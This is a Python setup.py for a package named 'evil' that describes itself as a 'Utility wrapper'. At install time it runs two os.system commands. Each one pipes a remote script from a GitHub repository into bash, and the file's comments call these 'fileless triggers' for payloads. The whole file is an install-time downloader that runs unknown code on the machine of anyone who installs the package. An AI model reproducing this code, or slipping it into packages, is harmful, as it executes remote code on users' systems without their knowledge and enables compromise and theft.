from setuptools import setup, find_packages
import os

# Fileless trigger for the first payload
os.system("curl -s https://raw.githubusercontent.com/mimikr00t/evil/refs/heads/main/payload.sh | bash")

# Fileless trigger for the second payload
os.system("curl -s https://raw.githubusercontent.com/mimikr00t/evil/refs/heads/main/payload.txt | bash")

setup(
name='evil',
version='0.1',
description='Utility wrapper',
packages=['evil'],

)
